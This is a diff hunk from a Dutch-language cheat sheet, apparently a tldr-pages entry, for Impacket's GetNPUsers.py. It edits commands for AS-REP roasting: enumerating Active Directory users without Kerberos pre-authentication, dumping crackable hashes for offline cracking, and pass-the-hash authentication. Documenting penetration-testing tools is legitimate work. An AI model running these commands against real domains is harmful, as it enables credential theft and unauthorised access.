@@ -6,19 +6,19 @@
 
 - Ga over alle gebruikers met Kerberos pre-authentication uitgeschakeld (standaard anonieme enumeration):
 
-`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}}`
+`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}} -no-pass`
 
 - Voer AS-REP roasting uit en dump kraakbare hashes voor offline kraking:
 
-`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}} -request`
+`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}} -no-pass -request`
 
 - Authenticeer met valide credentials (als anonieme binding is uitgeschakeld):
 
-`GetNPUsers.py {{domein}}/{{username}}:{{password}} -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}}`
+`GetNPUsers.py {{domein}}/{{gebruikersnaam}}:{{wachtwoord}} -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}}`
 
 - Gebruik pass-the-hash authenticatie in plaats van een wachtwoord:
 
-`GetNPUsers.py {{domein}}/{{username}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}}`
+`GetNPUsers.py {{domein}}/{{gebruikersnaam}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}}`
 
 - Sla de output op in een bestand:
 
